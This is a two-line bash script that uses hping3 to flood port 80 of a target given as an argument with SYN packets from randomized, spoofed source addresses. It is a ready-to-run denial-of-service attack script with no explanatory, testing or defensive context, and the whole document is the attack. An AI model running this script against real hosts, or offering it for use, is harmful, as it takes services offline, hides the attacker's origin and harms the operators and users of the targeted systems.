#!/bin/bash
hping3 -S --rand-source --flood -p 80 "$1"
